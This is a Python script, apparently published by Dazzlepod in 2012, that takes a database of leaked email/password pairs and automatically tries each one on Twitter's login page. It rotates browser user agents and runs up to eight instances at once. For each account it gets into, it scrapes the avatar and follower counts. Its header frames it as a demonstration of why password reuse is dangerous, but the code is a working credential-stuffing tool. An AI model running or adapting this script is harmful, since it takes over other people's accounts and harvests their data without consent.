#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# $Header: //depot/reusable/reusable.py#2 $
# $Date: 2012/04/12 $
#
# reusable.py - A script that attempts to reuse given list of email/password combinations to login into other sites to demonstrate the danger of password reuse.
# This script requires mechanize (http://wwwsearch.sourceforge.net/mechanize/) to be installed.
#
# See http://dazzlepod.com/reusable/ for more details.
#
# 2012 (C) Dazzlepod
#

import cookielib
import mechanize
import os
import random
import re
import socket
import sqlite3
import urllib2
from datetime import datetime

# sqlite3 database with a table called accounts created using CREATE TABLE accounts (email TEXT, password TEXT, data TEXT);
# You will need to populate this database with your list of email/password combinations; the data field should be left empty
DATABASE = 'accounts.db'

# Limit up to this number of instances of this script to run concurrently at any one time; ll of them will access the same sqlite3 database, accounts.db
MAX_INSTANCES = 8

# Set this to the appropriate value depending on the number of entries you have in accounts.db
ACCOUNTS_PER_INSTANCE = 1000

# Useful to timeout hanged mechanize requests
SOCKET_TIMEOUT = 3.0

# Random list of HTTP user agents to be used by mechanize when sending requests
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7',
    'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
]

# Process ID for this instance; to be written into semaphore file
pid = os.getpid()

# Creates log and semaphore file for this instance
index = 1
instance_id = 0
while index <= MAX_INSTANCES:
    if not os.path.exists('%d.sem' % index):
        instance_id = index
        break
    index += 1
if instance_id > 0:
    log = open('%d.log' % instance_id, 'w', 0)    
    sem = open('%d.sem' % instance_id, 'w')
    sem.write('%s' % pid)
    sem.close()
    print '[%s] [%d] starting' % (datetime.now(), instance_id)
else:
    exit(0)

# Default timeout is 5.0 seconds; higher value is required in order to run multiple instances of this script
conn = sqlite3.connect(DATABASE, timeout = 60.0)

# Always return bytestrings
conn.text_factory = str

cur = conn.cursor()
query = "SELECT rowid, email, password FROM accounts WHERE data = '' ORDER BY RANDOM() LIMIT %d" % ACCOUNTS_PER_INSTANCE
cur.execute(query)
accounts = cur.fetchall()

total_accounts = len(accounts)
index = 0
passed = 0

socket.setdefaulttimeout(SOCKET_TIMEOUT)

# From here on, output will be written into the log file for this instance
for account in accounts:
    index += 1

    (rowid, email, password) = account
    print >>log, '[%s] [%d / %d | passed = %d] email=%s' % (datetime.now(), index, total_accounts, passed, email)

    br = mechanize.Browser()

    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)

    br.addheaders = [
        ('User-Agent', '%s' % USER_AGENTS[random.randrange(0, len(USER_AGENTS))]),
        ('Referer', 'http://twitter.com'),
    ]

    # Attempts to login into Twitter
    try:
        br.open('http://twitter.com/login')
    except urllib2.URLError:
        print >>log, '\t[EXCEPTION] opening URL (%s)' % email
        continue
    except socket.timeout:
        print >>log, 'Connection timed out'
        break

    # Twitter-specific login form
    try:
        br.select_form(nr=2)
    except Exception:
        print >>log, '\t[EXCEPTION] selecting form (%s)' % email
        continue
    br.form["session[username_or_email]"] = email
    br.form["session[password]"] = password

    try:
        br.submit()
    except Exception:
        print >>log, '\t[EXCEPTION] submit form (%s)' % email
        continue

    page = ''
    page = br.response().read()

    # Twitter-specific first page after successful login
    if '/logout' in page:

        # We want to store URL to the personalized avatar
        try:
            avatar = re.findall('class="avatar size32" src="(?P<avatar>.*?)"', page)[0]
        except IndexError:
            continue
        if 'default_profile_images' in avatar:
            avatar = ''

        # We want to get the number of followers and number of people being followed by this account
        following = int(re.findall('data-element-term="following_stats"><strong>(?P<following>.*?)</strong>', page)[0].replace(',', ''))
        followers = int(re.findall('data-element-term="follower_stats"><strong>(?P<followers>.*?)</strong>', page)[0].replace(',', ''))

        data = '{"avatar": "%s", "following": "%d", "followers": "%d"}' % (avatar, following, followers)
        cur.execute('UPDATE accounts SET data = ? WHERE rowid = ?', (data, rowid,))

        print >>log, '\t[PASSED] %s %s' % (email, data)
        passed += 1

    else:
        # Remove this account from accounts.db if login failed
        cur.execute('DELETE FROM accounts WHERE rowid = ?', (rowid,))
        print >>log, '\t[FAILED] %s' % email

    conn.commit()

cur.close()

os.remove('%d.sem' % instance_id)
log.close()
